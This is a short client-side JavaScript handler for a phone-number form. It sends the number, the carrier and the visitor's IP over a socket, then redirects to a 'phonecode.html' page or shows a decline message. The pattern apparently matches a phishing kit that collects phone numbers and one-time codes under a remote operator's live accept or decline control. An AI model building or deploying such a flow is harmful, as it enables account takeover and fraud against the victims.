    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("phoneForm");
      const overlay = document.getElementById("loadingOverlay");
      const declineMsg = document.getElementById("decline-message");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");

        while (window.visitorIP === null) {
          await new Promise((r) => setTimeout(r, 50));
        }

        const phoneNum = document.getElementById("phone_input").value;
        const operator = document.getElementById("Selectـnetworkـoperator").value;

        window.socket.emit("submitPhone", {
          ip: window.visitorIP,
          phoneNumber: phoneNum,
          operator,
        });
      });

      
      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        declineMsg.style.display = "block";
      }

      
      window.socket.on("ackPhone", (resp) => {
        if (resp.success) {
          window.location.href = "phonecode.html";
        } else {
          
          overlay.classList.remove("d-flex");
          overlay.classList.add("d-none");
          declineMsg.style.display = "block";
          console.error(resp.error);
        }
      });
    });